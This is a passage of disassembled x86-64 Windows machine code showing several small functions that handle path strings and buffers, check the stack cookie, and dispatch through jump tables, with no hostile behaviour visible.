   140004440:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004445:	57                   	push   %rdi
   140004446:	48 83 ec 20          	sub    $0x20,%rsp
   14000444a:	48 8b fa             	mov    %rdx,%rdi
   14000444d:	4d 8b c8             	mov    %r8,%r9
   140004450:	4c 8d 05 25 76 02 00 	lea    0x27625(%rip),%r8        # 0x14002ba7c
   140004457:	ba 00 10 00 00       	mov    $0x1000,%edx
   14000445c:	48 8b d9             	mov    %rcx,%rbx
   14000445f:	e8 1c d8 ff ff       	call   0x140001c80
   140004464:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004469:	7d 4d                	jge    0x1400044b8
   14000446b:	ba 3a 00 00 00       	mov    $0x3a,%edx
   140004470:	48 8b cb             	mov    %rbx,%rcx
   140004473:	e8 08 90 00 00       	call   0x14000d480
   140004478:	48 85 c0             	test   %rax,%rax
   14000447b:	74 3b                	je     0x1400044b8
   14000447d:	c6 00 00             	movb   $0x0,(%rax)
   140004480:	48 8b d7             	mov    %rdi,%rdx
   140004483:	48 ff c0             	inc    %rax
   140004486:	48 2b d0             	sub    %rax,%rdx
   140004489:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004490:	0f b6 08             	movzbl (%rax),%ecx
   140004493:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
   140004496:	48 8d 40 01          	lea    0x1(%rax),%rax
   14000449a:	84 c9                	test   %cl,%cl
   14000449c:	75 f2                	jne    0x140004490
   14000449e:	38 0b                	cmp    %cl,(%rbx)
   1400044a0:	74 16                	je     0x1400044b8
   1400044a2:	0f b6 07             	movzbl (%rdi),%eax
   1400044a5:	f6 d8                	neg    %al
   1400044a7:	1b c0                	sbb    %eax,%eax
   1400044a9:	f7 d8                	neg    %eax
   1400044ab:	ff c8                	dec    %eax
   1400044ad:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400044b2:	48 83 c4 20          	add    $0x20,%rsp
   1400044b6:	5f                   	pop    %rdi
   1400044b7:	c3                   	ret
   1400044b8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400044bd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400044c2:	48 83 c4 20          	add    $0x20,%rsp
   1400044c6:	5f                   	pop    %rdi
   1400044c7:	c3                   	ret
   1400044c8:	cc                   	int3
   1400044c9:	cc                   	int3
   1400044ca:	cc                   	int3
   1400044cb:	cc                   	int3
   1400044cc:	cc                   	int3
   1400044cd:	cc                   	int3
   1400044ce:	cc                   	int3
   1400044cf:	cc                   	int3
   1400044d0:	40 53                	rex push %rbx
   1400044d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400044d6:	4c 8b ca             	mov    %rdx,%r9
   1400044d9:	4c 8d 05 9c 75 02 00 	lea    0x2759c(%rip),%r8        # 0x14002ba7c
   1400044e0:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400044e5:	48 8b d9             	mov    %rcx,%rbx
   1400044e8:	e8 93 d7 ff ff       	call   0x140001c80
   1400044ed:	3d 00 10 00 00       	cmp    $0x1000,%eax
   1400044f2:	7c 08                	jl     0x1400044fc
   1400044f4:	32 c0                	xor    %al,%al
   1400044f6:	48 83 c4 20          	add    $0x20,%rsp
   1400044fa:	5b                   	pop    %rbx
   1400044fb:	c3                   	ret
   1400044fc:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140004503:	80 7c 03 01 00       	cmpb   $0x0,0x1(%rbx,%rax,1)
   140004508:	48 8d 40 01          	lea    0x1(%rax),%rax
   14000450c:	75 f5                	jne    0x140004503
   14000450e:	80 7c 18 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rbx,1)
   140004513:	75 05                	jne    0x14000451a
   140004515:	c6 44 18 ff 00       	movb   $0x0,-0x1(%rax,%rbx,1)
   14000451a:	ba 5c 00 00 00       	mov    $0x5c,%edx
   14000451f:	48 8b cb             	mov    %rbx,%rcx
   140004522:	e8 d5 8f 00 00       	call   0x14000d4fc
   140004527:	48 85 c0             	test   %rax,%rax
   14000452a:	74 0b                	je     0x140004537
   14000452c:	c6 00 00             	movb   $0x0,(%rax)
   14000452f:	b0 01                	mov    $0x1,%al
   140004531:	48 83 c4 20          	add    $0x20,%rsp
   140004535:	5b                   	pop    %rbx
   140004536:	c3                   	ret
   140004537:	66 c7 03 2e 00       	movw   $0x2e,(%rbx)
   14000453c:	b0 01                	mov    $0x1,%al
   14000453e:	48 83 c4 20          	add    $0x20,%rsp
   140004542:	5b                   	pop    %rbx
   140004543:	c3                   	ret
   140004544:	cc                   	int3
   140004545:	cc                   	int3
   140004546:	cc                   	int3
   140004547:	cc                   	int3
   140004548:	cc                   	int3
   140004549:	cc                   	int3
   14000454a:	cc                   	int3
   14000454b:	cc                   	int3
   14000454c:	cc                   	int3
   14000454d:	cc                   	int3
   14000454e:	cc                   	int3
   14000454f:	cc                   	int3
   140004550:	b8 78 20 00 00       	mov    $0x2078,%eax
   140004555:	e8 66 83 00 00       	call   0x14000c8c0
   14000455a:	48 2b e0             	sub    %rax,%rsp
   14000455d:	48 8b 05 dc 9a 03 00 	mov    0x39adc(%rip),%rax        # 0x14003e040
   140004564:	48 33 c4             	xor    %rsp,%rax
   140004567:	48 89 84 24 60 20 00 	mov    %rax,0x2060(%rsp)
   14000456e:	00 
   14000456f:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004575:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000457a:	e8 81 4e 00 00       	call   0x140009400
   14000457f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004584:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004589:	e8 f6 17 01 00       	call   0x140015d84
   14000458e:	33 c9                	xor    %ecx,%ecx
   140004590:	85 c0                	test   %eax,%eax
   140004592:	0f 94 c1             	sete   %cl
   140004595:	8b c1                	mov    %ecx,%eax
   140004597:	48 8b 8c 24 60 20 00 	mov    0x2060(%rsp),%rcx
   14000459e:	00 
   14000459f:	48 33 cc             	xor    %rsp,%rcx
   1400045a2:	e8 19 80 00 00       	call   0x14000c5c0
   1400045a7:	48 81 c4 78 20 00 00 	add    $0x2078,%rsp
   1400045ae:	c3                   	ret
   1400045af:	cc                   	int3
   1400045b0:	40 53                	rex push %rbx
   1400045b2:	b8 50 20 00 00       	mov    $0x2050,%eax
   1400045b7:	e8 04 83 00 00       	call   0x14000c8c0
   1400045bc:	48 2b e0             	sub    %rax,%rsp
   1400045bf:	48 8b 05 7a 9a 03 00 	mov    0x39a7a(%rip),%rax        # 0x14003e040
   1400045c6:	48 33 c4             	xor    %rsp,%rax
   1400045c9:	48 89 84 24 40 20 00 	mov    %rax,0x2040(%rsp)
   1400045d0:	00 
   1400045d1:	48 8b da             	mov    %rdx,%rbx
   1400045d4:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400045da:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400045df:	e8 1c 4e 00 00       	call   0x140009400
   1400045e4:	41 b8 0a 00 00 00    	mov    $0xa,%r8d
   1400045ea:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400045ef:	48 8b cb             	mov    %rbx,%rcx
   1400045f2:	e8 09 4e 00 00       	call   0x140009400
   1400045f7:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400045fc:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004601:	e8 fe 19 01 00       	call   0x140016004
   140004606:	48 8b 8c 24 40 20 00 	mov    0x2040(%rsp),%rcx
   14000460d:	00 
   14000460e:	48 33 cc             	xor    %rsp,%rcx
   140004611:	e8 aa 7f 00 00       	call   0x14000c5c0
   140004616:	48 81 c4 50 20 00 00 	add    $0x2050,%rsp
   14000461d:	5b                   	pop    %rbx
   14000461e:	c3                   	ret
   14000461f:	cc                   	int3
   140004620:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004625:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000462a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000462f:	57                   	push   %rdi
   140004630:	48 83 ec 20          	sub    $0x20,%rsp
   140004634:	49 8b f0             	mov    %r8,%rsi
   140004637:	4c 8b ca             	mov    %rdx,%r9
   14000463a:	bd 00 10 00 00       	mov    $0x1000,%ebp
   14000463f:	4c 8d 05 36 74 02 00 	lea    0x27436(%rip),%r8        # 0x14002ba7c
   140004646:	8b d5                	mov    %ebp,%edx
   140004648:	48 8b f9             	mov    %rcx,%rdi
   14000464b:	e8 30 d6 ff ff       	call   0x140001c80
   140004650:	48 63 c8             	movslq %eax,%rcx
   140004653:	48 81 f9 ff 0f 00 00 	cmp    $0xfff,%rcx
   14000465a:	73 66                	jae    0x1400046c2
   14000465c:	80 7c 39 ff 5c       	cmpb   $0x5c,-0x1(%rcx,%rdi,1)
   140004661:	74 0a                	je     0x14000466d
   140004663:	66 c7 04 39 5c 00    	movw   $0x5c,(%rcx,%rdi,1)
   140004669:	48 83 c1 02          	add    $0x2,%rcx
   14000466d:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   140004674:	48 2b e9             	sub    %rcx,%rbp
   140004677:	48 8b c3             	mov    %rbx,%rax
   14000467a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004680:	48 ff c0             	inc    %rax
   140004683:	80 3c 06 00          	cmpb   $0x0,(%rsi,%rax,1)
   140004687:	75 f7                	jne    0x140004680
   140004689:	48 3b c5             	cmp    %rbp,%rax
   14000468c:	73 34                	jae    0x1400046c2
   14000468e:	80 7c 30 ff 5c       	cmpb   $0x5c,-0x1(%rax,%rsi,1)
   140004693:	4c 8b c5             	mov    %rbp,%r8
   140004696:	48 8b d6             	mov    %rsi,%rdx
   140004699:	48 8b cf             	mov    %rdi,%rcx
   14000469c:	75 1a                	jne    0x1400046b8
   14000469e:	e8 fd 16 01 00       	call   0x140015da0
   1400046a3:	80 7c 1f 01 00       	cmpb   $0x0,0x1(%rdi,%rbx,1)
   1400046a8:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   1400046ac:	75 f5                	jne    0x1400046a3
   1400046ae:	c6 44 3b ff 00       	movb   $0x0,-0x1(%rbx,%rdi,1)
   1400046b3:	48 8b c7             	mov    %rdi,%rax
   1400046b6:	eb 0c                	jmp    0x1400046c4
   1400046b8:	e8 e3 16 01 00       	call   0x140015da0
   1400046bd:	48 8b c7             	mov    %rdi,%rax
   1400046c0:	eb 02                	jmp    0x1400046c4
   1400046c2:	33 c0                	xor    %eax,%eax
   1400046c4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400046c9:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400046ce:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400046d3:	48 83 c4 20          	add    $0x20,%rsp
   1400046d7:	5f                   	pop    %rdi
   1400046d8:	c3                   	ret
   1400046d9:	cc                   	int3
   1400046da:	cc                   	int3
   1400046db:	cc                   	int3
   1400046dc:	cc                   	int3
   1400046dd:	cc                   	int3
   1400046de:	cc                   	int3
   1400046df:	cc                   	int3
   1400046e0:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400046e5:	57                   	push   %rdi
   1400046e6:	b8 30 40 00 00       	mov    $0x4030,%eax
   1400046eb:	e8 d0 81 00 00       	call   0x14000c8c0
   1400046f0:	48 2b e0             	sub    %rax,%rsp
   1400046f3:	48 8b 05 46 99 03 00 	mov    0x39946(%rip),%rax        # 0x14003e040
   1400046fa:	48 33 c4             	xor    %rsp,%rax
   1400046fd:	48 89 84 24 20 40 00 	mov    %rax,0x4020(%rsp)
   140004704:	00 
   140004705:	48 8b da             	mov    %rdx,%rbx
   140004708:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000470e:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004713:	48 8b f9             	mov    %rcx,%rdi
   140004716:	e8 e5 4c 00 00       	call   0x140009400
   14000471b:	48 85 c0             	test   %rax,%rax
   14000471e:	74 74                	je     0x140004794
   140004720:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140004726:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   14000472d:	00 
   14000472e:	48 8b cb             	mov    %rbx,%rcx
   140004731:	e8 ca 4c 00 00       	call   0x140009400
   140004736:	48 85 c0             	test   %rax,%rax
   140004739:	74 59                	je     0x140004794
   14000473b:	45 33 c0             	xor    %r8d,%r8d
   14000473e:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140004743:	44 39 05 be 98 03 00 	cmp    %r8d,0x398be(%rip)        # 0x14003e008
   14000474a:	48 8d 8c 24 20 20 00 	lea    0x2020(%rsp),%rcx
   140004751:	00 
   140004752:	b8 02 00 00 00       	mov    $0x2,%eax
   140004757:	44 0f 45 c0          	cmovne %eax,%r8d
   14000475b:	ff 15 8f 69 02 00    	call   *0x2698f(%rip)        # 0x14002b0f0
   140004761:	84 c0                	test   %al,%al
   140004763:	75 2b                	jne    0x140004790
   140004765:	83 3d 9c 98 03 00 00 	cmpl   $0x0,0x3989c(%rip)        # 0x14003e008
   14000476c:	74 26                	je     0x140004794
   14000476e:	ff 15 5c 69 02 00    	call   *0x2695c(%rip)        # 0x14002b0d0
   140004774:	83 f8 57             	cmp    $0x57,%eax
   140004777:	75 1b                	jne    0x140004794
   140004779:	48 8b d3             	mov    %rbx,%rdx
   14000477c:	c7 05 82 98 03 00 00 	movl   $0x0,0x39882(%rip)        # 0x14003e008
   140004783:	00 00 00 
   140004786:	48 8b cf             	mov    %rdi,%rcx
   140004789:	e8 52 ff ff ff       	call   0x1400046e0
   14000478e:	eb 09                	jmp    0x140004799
   140004790:	33 c0                	xor    %eax,%eax
   140004792:	eb 05                	jmp    0x140004799
   140004794:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004799:	48 8b 8c 24 20 40 00 	mov    0x4020(%rsp),%rcx
   1400047a0:	00 
   1400047a1:	48 33 cc             	xor    %rsp,%rcx
   1400047a4:	e8 17 7e 00 00       	call   0x14000c5c0
   1400047a9:	48 8b 9c 24 50 40 00 	mov    0x4050(%rsp),%rbx
   1400047b0:	00 
   1400047b1:	48 81 c4 30 40 00 00 	add    $0x4030,%rsp
   1400047b8:	5f                   	pop    %rdi
   1400047b9:	c3                   	ret
   1400047ba:	cc                   	int3
   1400047bb:	cc                   	int3
   1400047bc:	cc                   	int3
   1400047bd:	cc                   	int3
   1400047be:	cc                   	int3
   1400047bf:	cc                   	int3
   1400047c0:	40 53                	rex push %rbx
   1400047c2:	b8 40 20 00 00       	mov    $0x2040,%eax
   1400047c7:	e8 f4 80 00 00       	call   0x14000c8c0
   1400047cc:	48 2b e0             	sub    %rax,%rsp
   1400047cf:	48 8b 05 6a 98 03 00 	mov    0x3986a(%rip),%rax        # 0x14003e040
   1400047d6:	48 33 c4             	xor    %rsp,%rax
   1400047d9:	48 89 84 24 30 20 00 	mov    %rax,0x2030(%rsp)
   1400047e0:	00 
   1400047e1:	48 8b da             	mov    %rdx,%rbx
   1400047e4:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400047ea:	48 8b d1             	mov    %rcx,%rdx
   1400047ed:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400047f2:	e8 81 26 01 00       	call   0x140016e78
   1400047f7:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400047fc:	e8 db 31 01 00       	call   0x1400179dc
   140004801:	48 89 03             	mov    %rax,(%rbx)
   140004804:	48 f7 d8             	neg    %rax
   140004807:	1b c0                	sbb    %eax,%eax
   140004809:	f7 d8                	neg    %eax
   14000480b:	ff c8                	dec    %eax
   14000480d:	48 8b 8c 24 30 20 00 	mov    0x2030(%rsp),%rcx
   140004814:	00 
   140004815:	48 33 cc             	xor    %rsp,%rcx
   140004818:	e8 a3 7d 00 00       	call   0x14000c5c0
   14000481d:	48 81 c4 40 20 00 00 	add    $0x2040,%rsp
   140004824:	5b                   	pop    %rbx
   140004825:	c3                   	ret
   140004826:	cc                   	int3
   140004827:	cc                   	int3
   140004828:	cc                   	int3
   140004829:	cc                   	int3
   14000482a:	cc                   	int3
   14000482b:	cc                   	int3
   14000482c:	cc                   	int3
   14000482d:	cc                   	int3
   14000482e:	cc                   	int3
   14000482f:	cc                   	int3
   140004830:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004835:	55                   	push   %rbp
   140004836:	48 8b ec             	mov    %rsp,%rbp
   140004839:	48 83 ec 70          	sub    $0x70,%rsp
   14000483d:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140004844:	49 8b d9             	mov    %r9,%rbx
   140004847:	4c 8b d9             	mov    %rcx,%r11
   14000484a:	44 8b 90 28 10 00 00 	mov    0x1028(%rax),%r10d
   140004851:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   140004858:	45 03 d2             	add    %r10d,%r10d
   14000485b:	44 0b d0             	or     %eax,%r10d
   14000485e:	41 81 c2 98 fd ff ff 	add    $0xfffffd98,%r10d
   140004865:	41 83 fa 0b          	cmp    $0xb,%r10d
   140004869:	77 7a                	ja     0x1400048e5
   14000486b:	48 8d 15 8e b7 ff ff 	lea    -0x4872(%rip),%rdx        # 0x140000000
   140004872:	49 63 c2             	movslq %r10d,%rax
   140004875:	8b 8c 82 f8 48 00 00 	mov    0x48f8(%rdx,%rax,4),%ecx
   14000487c:	48 03 ca             	add    %rdx,%rcx
   14000487f:	ff e1                	jmp    *%rcx
   140004881:	4d 63 c8             	movslq %r8d,%r9
   140004884:	4d 8d 43 58          	lea    0x58(%r11),%r8
   140004888:	48 8b 05 61 d5 03 00 	mov    0x3d561(%rip),%rax        # 0x140041df0
   14000488f:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004893:	49 8b d3             	mov    %r11,%rdx
   140004896:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   14000489b:	ff 15 0f 6c 02 00    	call   *0x26c0f(%rip)        # 0x14002b4b0
   1400048a1:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400048a5:	0f 10 00             	movups (%rax),%xmm0
   1400048a8:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400048ac:	48 8b 05 e5 d5 03 00 	mov    0x3d5e5(%rip),%rax        # 0x140041e98
   1400048b3:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400048b7:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400048bb:	ff 15 ef 6b 02 00    	call   *0x26bef(%rip)        # 0x14002b4b0
   1400048c1:	f7 d8                	neg    %eax
   1400048c3:	1b c0                	sbb    %eax,%eax
   1400048c5:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400048cc:	00 
   1400048cd:	48 83 c4 70          	add    $0x70,%rsp
   1400048d1:	5d                   	pop    %rbp
   1400048d2:	c3                   	ret
   1400048d3:	4d 63 c8             	movslq %r8d,%r9
   1400048d6:	4d 8d 43 68          	lea    0x68(%r11),%r8
   1400048da:	eb ac                	jmp    0x140004888
   1400048dc:	4d 63 c8             	movslq %r8d,%r9
   1400048df:	4d 8d 43 78          	lea    0x78(%r11),%r8
   1400048e3:	eb a3                	jmp    0x140004888
   1400048e5:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   1400048ec:	00 
   1400048ed:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400048f2:	48 83 c4 70          	add    $0x70,%rsp
   1400048f6:	5d                   	pop    %rbp
   1400048f7:	c3                   	ret
   1400048f8:	81 48 00 00 e5 48 00 	orl    $0x48e500,0x0(%rax)
   1400048ff:	00 81 48 00 00 e5    	add    %al,-0x1affffb8(%rcx)
   140004905:	48 00 00             	rex.W add %al,(%rax)
   140004908:	d3 48 00             	rorl   %cl,0x0(%rax)
   14000490b:	00 e5                	add    %ah,%ch
   14000490d:	48 00 00             	rex.W add %al,(%rax)
   140004910:	dc 48 00             	fmull  0x0(%rax)
   140004913:	00 e5                	add    %ah,%ch
   140004915:	48 00 00             	rex.W add %al,(%rax)
   140004918:	dc 48 00             	fmull  0x0(%rax)
   14000491b:	00 e5                	add    %ah,%ch
   14000491d:	48 00 00             	rex.W add %al,(%rax)
   140004920:	dc 48 00             	fmull  0x0(%rax)
   140004923:	00 dc                	add    %bl,%ah
   140004925:	48 00 00             	rex.W add %al,(%rax)
   140004928:	cc                   	int3
   140004929:	cc                   	int3
   14000492a:	cc                   	int3
   14000492b:	cc                   	int3
   14000492c:	cc                   	int3
   14000492d:	cc                   	int3
   14000492e:	cc                   	int3
   14000492f:	cc                   	int3
   140004930:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004935:	55                   	push   %rbp
   140004936:	48 8b ec             	mov    %rsp,%rbp
   140004939:	48 83 ec 50          	sub    $0x50,%rsp
   14000493d:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140004944:	4d 8b d9             	mov    %r9,%r11
   140004947:	48 8b d9             	mov    %rcx,%rbx
   14000494a:	44 8b 90 28 10 00 00 	mov    0x1028(%rax),%r10d
   140004951:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   140004958:	45 03 d2             	add    %r10d,%r10d
   14000495b:	44 0b d0             	or     %eax,%r10d
   14000495e:	41 81 c2 98 fd ff ff 	add    $0xfffffd98,%r10d
   140004965:	41 83 fa 0b          	cmp    $0xb,%r10d
   140004969:	0f 87 1a 01 00 00    	ja     0x140004a89
   14000496f:	48 8d 15 8a b6 ff ff 	lea    -0x4976(%rip),%rdx        # 0x140000000
   140004976:	49 63 c2             	movslq %r10d,%rax
   140004979:	8b 8c 82 9c 4a 00 00 	mov    0x4a9c(%rdx,%rax,4),%ecx
   140004980:	48 03 ca             	add    %rdx,%rcx
   140004983:	ff e1                	jmp    *%rcx
   140004985:	48 8b 05 64 d4 03 00 	mov    0x3d464(%rip),%rax        # 0x140041df0
   14000498c:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004990:	4d 63 c8             	movslq %r8d,%r9
   140004993:	48 8b d3             	mov    %rbx,%rdx
   140004996:	4c 8d 83 00 01 00 00 	lea    0x100(%rbx),%r8
   14000499d:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   1400049a2:	ff 15 08 6b 02 00    	call   *0x26b08(%rip)        # 0x14002b4b0
   1400049a8:	0f 10 00             	movups (%rax),%xmm0
   1400049ab:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400049af:	c7 83 f8 00 00 00 01 	movl   $0x1,0xf8(%rbx)
   1400049b6:	00 00 00 
   1400049b9:	48 8b 05 d8 d4 03 00 	mov    0x3d4d8(%rip),%rax        # 0x140041e98
   1400049c0:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400049c4:	0f 29 45 e0          	movaps %xmm0,-0x20(%rbp)
   1400049c8:	0f 29 4d f0          	movaps %xmm1,-0x10(%rbp)
   1400049cc:	ff 15 de 6a 02 00    	call   *0x26ade(%rip)        # 0x14002b4b0
   1400049d2:	f7 d8                	neg    %eax
   1400049d4:	1b c0                	sbb    %eax,%eax
   1400049d6:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   1400049db:	48 83 c4 50          	add    $0x50,%rsp
   1400049df:	5d                   	pop    %rbp
   1400049e0:	c3                   	ret
   1400049e1:	48 8b 05 08 d4 03 00 	mov    0x3d408(%rip),%rax        # 0x140041df0
   1400049e8:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400049ec:	4d 63 c8             	movslq %r8d,%r9
   1400049ef:	48 8b d3             	mov    %rbx,%rdx
   1400049f2:	4c 8d 83 20 01 00 00 	lea    0x120(%rbx),%r8
   1400049f9:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   1400049fe:	ff 15 ac 6a 02 00    	call   *0x26aac(%rip)        # 0x14002b4b0
   140004a04:	0f 10 00             	movups (%rax),%xmm0
   140004a07:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004a0b:	c7 83 18 01 00 00 01 	movl   $0x1,0x118(%rbx)
   140004a12:	00 00 00 
   140004a15:	eb a2                	jmp    0x1400049b9
   140004a17:	48 8b 05 d2 d3 03 00 	mov    0x3d3d2(%rip),%rax        # 0x140041df0
   140004a1e:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004a22:	4d 63 c8             	movslq %r8d,%r9
   140004a25:	48 8b d3             	mov    %rbx,%rdx
   140004a28:	4c 8d 83 38 01 00 00 	lea    0x138(%rbx),%r8
   140004a2f:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   140004a34:	ff 15 76 6a 02 00    	call   *0x26a76(%rip)        # 0x14002b4b0
   140004a3a:	0f 10 00             	movups (%rax),%xmm0
   140004a3d:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004a41:	c7 83 30 01 00 00 01 	movl   $0x1,0x130(%rbx)
   140004a48:	00 00 00 
   140004a4b:	e9 69 ff ff ff       	jmp    0x1400049b9
   140004a50:	48 8b 05 99 d3 03 00 	mov    0x3d399(%rip),%rax        # 0x140041df0
   140004a57:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140004a5b:	4d 63 c8             	movslq %r8d,%r9
   140004a5e:	48 8b d3             	mov    %rbx,%rdx
   140004a61:	4c 8d 83 40 01 00 00 	lea    0x140(%rbx),%r8
   140004a68:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   140004a6d:	ff 15 3d 6a 02 00    	call   *0x26a3d(%rip)        # 0x14002b4b0
   140004a73:	0f 10 00             	movups (%rax),%xmm0
   140004a76:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004a7a:	c7 83 38 01 00 00 01 	movl   $0x1,0x138(%rbx)
   140004a81:	00 00 00 
   140004a84:	e9 30 ff ff ff       	jmp    0x1400049b9
   140004a89:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140004a8e:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004a93:	48 83 c4 50          	add    $0x50,%rsp
   140004a97:	5d                   	pop    %rbp
   140004a98:	c3                   	ret
   140004a99:	0f 1f 00             	nopl   (%rax)
   140004a9c:	85 49 00             	test   %ecx,0x0(%rcx)
   140004a9f:	00 89 4a 00 00 85    	add    %cl,-0x7affffb6(%rcx)
   140004aa5:	49 00 00             	rex.WB add %al,(%r8)
   140004aa8:	89 4a 00             	mov    %ecx,0x0(%rdx)
   140004aab:	00 e1                	add    %ah,%cl
   140004aad:	49 00 00             	rex.WB add %al,(%r8)
   140004ab0:	89 4a 00             	mov    %ecx,0x0(%rdx)
   140004ab3:	00 17                	add    %dl,(%rdi)
   140004ab5:	4a 00 00             	rex.WX add %al,(%rax)
   140004ab8:	89 4a 00             	mov    %ecx,0x0(%rdx)
   140004abb:	00 17                	add    %dl,(%rdi)
   140004abd:	4a 00 00             	rex.WX add %al,(%rax)
   140004ac0:	89 4a 00             	mov    %ecx,0x0(%rdx)
   140004ac3:	00 50 4a             	add    %dl,0x4a(%rax)
   140004ac6:	00 00                	add    %al,(%rax)
   140004ac8:	50                   	push   %rax
   140004ac9:	4a 00 00             	rex.WX add %al,(%rax)
   140004acc:	cc                   	int3
   140004acd:	cc                   	int3
   140004ace:	cc                   	int3
   140004acf:	cc                   	int3
   140004ad0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140004ad5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140004ada:	57                   	push   %rdi
   140004adb:	48 83 ec 70          	sub    $0x70,%rsp
   140004adf:	49 8b c0             	mov    %r8,%rax
   140004ae2:	48 8b fa             	mov    %rdx,%rdi
   140004ae5:	48 8b f1             	mov    %rcx,%rsi
   140004ae8:	45 33 c0             	xor    %r8d,%r8d
   140004aeb:	48 8b c8             	mov    %rax,%rcx
   140004aee:	33 d2                	xor    %edx,%edx
   140004af0:	e8 0b 49 00 00       	call   0x140009400
   140004af5:	48 8b d8             	mov    %rax,%rbx
   140004af8:	48 85 c0             	test   %rax,%rax
   140004afb:	75 17                	jne    0x140004b14
   140004afd:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004b02:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004b07:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140004b0b:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140004b0f:	49 8b e3             	mov    %r11,%rsp
   140004b12:	5f                   	pop    %rdi
   140004b13:	c3                   	ret
   140004b14:	48 8b 05 cd d2 03 00 	mov    0x3d2cd(%rip),%rax        # 0x140041de8
   140004b1b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004b20:	4c 8b cb             	mov    %rbx,%r9
   140004b23:	4c 8b c7             	mov    %rdi,%r8
   140004b26:	48 8b d6             	mov    %rsi,%rdx
   140004b29:	ff 15 81 69 02 00    	call   *0x26981(%rip)        # 0x14002b4b0
   140004b2f:	48 8b cb             	mov    %rbx,%rcx
   140004b32:	0f 10 00             	movups (%rax),%xmm0
   140004b35:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140004b3a:	0f 10 40 10          	movups 0x10(%rax),%xmm0
   140004b3e:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140004b43:	e8 58 04 01 00       	call   0x140014fa0
   140004b48:	0f 10 44 24 30       	movups 0x30(%rsp),%xmm0
   140004b4d:	48 8b 05 44 d3 03 00 	mov    0x3d344(%rip),%rax        # 0x140041e98
   140004b54:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140004b59:	0f 10 4c 24 50       	movups 0x50(%rsp),%xmm1
   140004b5e:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
